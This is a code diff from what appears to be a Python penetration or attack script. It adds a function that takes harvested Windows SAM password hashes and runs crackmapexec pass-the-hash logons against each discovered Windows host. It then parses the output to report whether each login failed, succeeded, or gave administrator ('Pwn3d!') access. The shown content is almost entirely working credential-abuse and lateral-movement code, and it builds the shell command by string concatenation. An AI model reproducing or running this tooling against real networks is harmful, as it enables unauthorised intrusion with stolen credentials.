@@ -19,10 +19,20 @@ def samGrab(ip, username, password):
 def osFingerprint(ipRange):
 
 # Step 3: use crackmapexec to try and log on to the windows machines
-# hashes: the correctly formatted (as a single string) hashes from the SAM grab
+# hashes: the correctly formatted (List of tuples) hashes from the SAM grab
 # ips: list of windows IPs found in step 2
 # Returns: a dictionary mapping each windows IP to the result of trying to log on to that system (success/fail, root/not root)
 def attemptLogon(hashes, ips):
+    results = {}
+    for ip in ips:
+        for (username, hash) in hashes:
+            command = 'crackmapexec ' + ip + ' -u ' + username + ' -H ' + hash + """ | sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mK]//g" | awk '{if($6 ~ /^\[-\]$/) {print "Failed"} else if($6 ~ /^\[\+\]$/) {if($9 == "(Pwn3d!)") {print "Root"} else {print "Login"}}}'"""
+            result = subprocess.check_output(command,
+                    shell=True).decode("utf-8").strip()
+            if ip not in results:
+                results[ip] = []
+            results[ip].append((username, result))
+    return results
 
 # Step 4: can probably do this in main
 
